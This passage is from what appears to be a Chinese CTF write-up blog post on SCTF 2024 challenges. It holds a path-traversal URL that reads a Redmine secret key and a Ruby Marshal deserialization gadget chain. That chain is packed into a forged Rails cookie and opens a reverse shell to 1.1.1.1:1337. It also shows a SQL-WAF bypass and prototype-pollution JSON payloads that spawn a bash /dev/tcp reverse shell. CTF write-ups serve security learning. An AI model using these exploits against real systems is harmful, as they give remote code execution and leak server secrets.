<p>获取secret</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;1.95.37.51&#x2F;profile&#x2F;usr&#x2F;share&#x2F;redmine&#x2F;instances&#x2F;default&#x2F;config&#x2F;secret_key.txt%3f</span><br></pre></td></tr></table></figure>

<p>环境安装失败，记录poc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Autoload the required classes</span><br><span class="line">require &#39;uri&#39;</span><br><span class="line">require &#39;rails&#x2F;all&#39;</span><br><span class="line">Gem::SpecFetcher</span><br><span class="line"></span><br><span class="line"># create a file a.rz and host it somewhere accessible with https</span><br><span class="line">def generate_rz_file(payload)</span><br><span class="line">  require &quot;zlib&quot;</span><br><span class="line">  spec &#x3D; Marshal.dump(Gem::Specification.new(&quot;bundler&quot;))</span><br><span class="line"></span><br><span class="line">  out &#x3D; Zlib::Deflate.deflate( spec + &quot;\&quot;]\n&quot; + payload + &quot;\necho ref;exit 0;\n&quot;)</span><br><span class="line">  puts out.inspect</span><br><span class="line"></span><br><span class="line">  File.open(&quot;a.rz&quot;, &quot;wb&quot;) do |file|</span><br><span class="line">    file.write(out)</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">def create_folder</span><br><span class="line">  uri &#x3D; URI::HTTP.allocate</span><br><span class="line">  uri.instance_variable_set(&quot;@path&quot;, &quot;&#x2F;&quot;)</span><br><span class="line">  uri.instance_variable_set(&quot;@scheme&quot;, &quot;s3&quot;)</span><br><span class="line">  uri.instance_variable_set(&quot;@host&quot;, &quot;hacker.com&#x2F;sctf2024&#x2F;a.rz?&quot;)  # use the https host+path with your rz file</span><br><span class="line"></span><br><span class="line">  uri.instance_variable_set(&quot;@port&quot;, &quot;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;cache&#x2F;bundler&#x2F;git&#x2F;aaa-e1a1d77599bf23fec08e2693f5dd418f77c56301&#x2F;&quot;)</span><br><span class="line">  uri.instance_variable_set(&quot;@user&quot;, &quot;user&quot;)</span><br><span class="line">  uri.instance_variable_set(&quot;@password&quot;, &quot;password&quot;)</span><br><span class="line"></span><br><span class="line">  spec &#x3D; Gem::Source.allocate</span><br><span class="line">  spec.instance_variable_set(&quot;@uri&quot;, uri)</span><br><span class="line">  spec.instance_variable_set(&quot;@update_cache&quot;, true)</span><br><span class="line"></span><br><span class="line">  request &#x3D; Gem::Resolver::IndexSpecification.allocate</span><br><span class="line">  request.instance_variable_set(&quot;@name&quot;, &quot;name&quot;)</span><br><span class="line">  request.instance_variable_set(&quot;@source&quot;, spec)</span><br><span class="line"></span><br><span class="line">  s &#x3D; [request]</span><br><span class="line"></span><br><span class="line">  r &#x3D; Gem::RequestSet.allocate</span><br><span class="line">  r.instance_variable_set(&quot;@sorted&quot;, s)</span><br><span class="line"></span><br><span class="line">  l &#x3D; Gem::RequestSet::Lockfile.allocate</span><br><span class="line">  l.instance_variable_set(&quot;@set&quot;, r)</span><br><span class="line">  l.instance_variable_set(&quot;@dependencies&quot;, [])</span><br><span class="line"></span><br><span class="line">  l</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">def git_gadget(git, reference)</span><br><span class="line">  gsg &#x3D; Gem::Source::Git.allocate</span><br><span class="line">  gsg.instance_variable_set(&quot;@git&quot;, git)</span><br><span class="line">  gsg.instance_variable_set(&quot;@reference&quot;, reference)</span><br><span class="line">  gsg.instance_variable_set(&quot;@root_dir&quot;,&quot;&#x2F;tmp&quot;)</span><br><span class="line">  gsg.instance_variable_set(&quot;@repository&quot;,&quot;vakzz&quot;)</span><br><span class="line">  gsg.instance_variable_set(&quot;@name&quot;,&quot;aaa&quot;)</span><br><span class="line"></span><br><span class="line">  basic_spec &#x3D; Gem::Resolver::Specification.allocate</span><br><span class="line">  basic_spec.instance_variable_set(&quot;@name&quot;,&quot;name&quot;)</span><br><span class="line">  basic_spec.instance_variable_set(&quot;@dependencies&quot;,[])</span><br><span class="line"></span><br><span class="line">  git_spec &#x3D; Gem::Resolver::GitSpecification.allocate</span><br><span class="line">  git_spec.instance_variable_set(&quot;@source&quot;, gsg)</span><br><span class="line">  git_spec.instance_variable_set(&quot;@spec&quot;, basic_spec)</span><br><span class="line"></span><br><span class="line">  spec &#x3D; Gem::Resolver::SpecSpecification.allocate</span><br><span class="line">  spec.instance_variable_set(&quot;@spec&quot;, git_spec)</span><br><span class="line"></span><br><span class="line">  spec</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">def popen_gadget</span><br><span class="line">  spec1 &#x3D; git_gadget(&quot;tee&quot;, &#123; in: &quot;&#x2F;tmp&#x2F;cache&#x2F;bundler&#x2F;git&#x2F;aaa-e1a1d77599bf23fec08e2693f5dd418f77c56301&#x2F;quick&#x2F;Marshal.4.8&#x2F;name-.gemspec&quot;&#125;)</span><br><span class="line">  spec2 &#x3D; git_gadget(&quot;sh&quot;, &#123;&#125;)</span><br><span class="line"></span><br><span class="line">  s &#x3D; [spec1, spec2]</span><br><span class="line"></span><br><span class="line">  r &#x3D; Gem::RequestSet.allocate</span><br><span class="line">  r.instance_variable_set(&quot;@sorted&quot;, s)</span><br><span class="line"></span><br><span class="line">  l &#x3D; Gem::RequestSet::Lockfile.allocate</span><br><span class="line">  l.instance_variable_set(&quot;@set&quot;, r)</span><br><span class="line">  l.instance_variable_set(&quot;@dependencies&quot;,[])</span><br><span class="line"></span><br><span class="line">  l</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">def to_s_wrapper(inner)</span><br><span class="line">  s &#x3D; Gem::Specification.new</span><br><span class="line">  s.instance_variable_set(&quot;@new_platform&quot;, inner)</span><br><span class="line">  s</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">folder_gadget &#x3D; create_folder</span><br><span class="line">exec_gadget &#x3D; popen_gadget</span><br><span class="line">generate_rz_file((&quot;ruby -rsocket -e &#39;exit if fork;c&#x3D;TCPSocket.new(\&quot;1.1.1.1\&quot;,\&quot;1337\&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,\&quot;r\&quot;)&#123;|io|c.print io.read&#125;end&#39;&quot;))</span><br><span class="line">r &#x3D; Marshal.dump([Gem::SpecFetcher, to_s_wrapper(folder_gadget), to_s_wrapper(exec_gadget)])</span><br><span class="line">#Marshal.load(r)</span><br><span class="line">#puts %&#123;Marshal.load([&quot;#&#123;r.unpack(&quot;H*&quot;)&#125;&quot;].pack(&quot;H*&quot;))&#125;</span><br><span class="line">def sign_and_encryt_data(data,secret_key_base)</span><br><span class="line">        salt &#x3D; &#39;authenticated encrypted cookie&#39;</span><br><span class="line">        encrypted_cookie_cipher&#x3D;&#39;aes-256-gcm&#39;</span><br><span class="line">        serializer&#x3D;ActiveSupport::MessageEncryptor::NullSerializer</span><br><span class="line">        key_generator&#x3D;ActiveSupport::KeyGenerator.new(secret_key_base,iterations: 1000)</span><br><span class="line">        key_len&#x3D;ActiveSupport::MessageEncryptor.key_len(encrypted_cookie_cipher)</span><br><span class="line">        secret&#x3D;key_generator.generate_key(salt,key_len)</span><br><span class="line">        encryptor&#x3D;ActiveSupport::MessageEncryptor.new(secret,cipher: encrypted_cookie_cipher,serializer: serializer)</span><br><span class="line">        data&#x3D;encryptor.encrypt_and_sign(data)</span><br><span class="line">        CGI::escape(data)</span><br><span class="line">end</span><br><span class="line">puts sign_and_encryt_data(r,ARGV[0])</span><br></pre></td></tr></table></figure>



<h1 id="SycServer2-0"><a href="#SycServer2-0" class="headerlink" title="SycServer2.0"></a>SycServer2.0</h1><p>登录框，前端对username、password进行sqlwaf、加密</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241001133002206.png" alt="image-20241001133002206"></p>
<p>将func wafsql置为空，然后万能密码登录</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241001133201196.png" alt="image-20241001133201196"></p>
<p>robots.txt中路由 <code>/ExP0rtApi?v=./&amp;f=app.js</code> 存在文件读取，CyberChef解密</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241001134053707.png" alt="image-20241001134053707"></p>
<p>通过污染env和shell环境变量来命令注入，<a target="_blank" rel="noopener" href="https://po6ix.github.io/Abusing-Environment-Variables/">Abusing Environment Variables</a>、<a target="_blank" rel="noopener" href="http://47.103.121.189/2023/04/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2023%E7%BA%BF%E4%B8%8B%E5%8D%8A%E5%86%B3%E8%B5%9B%E7%AA%81%E7%A0%B4%E9%A2%98errormsg%E5%A4%8D%E7%8E%B0/">网鼎杯2023线下半决赛突破题errormsg复现</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;user&quot;:&quot;__proto__&quot;,</span><br><span class="line">    &quot;date&quot;:&quot;2&quot;,</span><br><span class="line">    &quot;reportmessage&quot;:&#123;</span><br><span class="line">        &quot;shell&quot;:&quot;&#x2F;readflag&quot;,</span><br><span class="line">        &quot;env&quot;:&#123;</span><br><span class="line">            &quot;NODE_DEBUG&quot;:&quot;require(&#39;child_process&#39;).execSync(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1\&quot;&#39;);process.exit();&#x2F;&#x2F;&quot;,</span><br><span class="line">            &quot;NODE_OPTIONS&quot;:&quot;-r &#x2F;proc&#x2F;self&#x2F;environ&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;user&quot;:&quot;__proto__&quot;,</span><br><span class="line">    &quot;date&quot;:&quot;2&quot;,</span><br><span class="line">    &quot;reportmessage&quot;:&#123;</span><br><span class="line">        &quot;shell&quot;:&quot;&#x2F;bin&#x2F;bash&quot;,</span><br><span class="line">        &quot;env&quot;:&#123;</span><br><span class="line">            &quot;BASH_FUNC_whoami%%&quot;:&quot;() &#123; &#x2F;readflag;&#125;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002233451220.png" alt="image-20241002233451220"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/82/">https://blog.wm-team.cn/index.php/archives/82/</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qOueXdU3UaKiJoUnuUjBEA">https://mp.weixin.qq.com/s/qOueXdU3UaKiJoUnuUjBEA</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/jp2ePXS1feCn0XLwadXhlg">https://mp.weixin.qq.com/s/jp2ePXS1feCn0XLwadXhlg</a></p>

    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/09/03/Process-Injection2/" rel="prev" title="Process-Inject-贰">
                  <i class="fa fa-angle-left"></i> Process-Inject-贰
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/10/06/CVE-2024-45519/" rel="next" title="Zimbra-RCE-分析(CVE-2024-45519)">
                  Zimbra-RCE-分析(CVE-2024-45519) <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Y0ng</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  





</body>
</html>
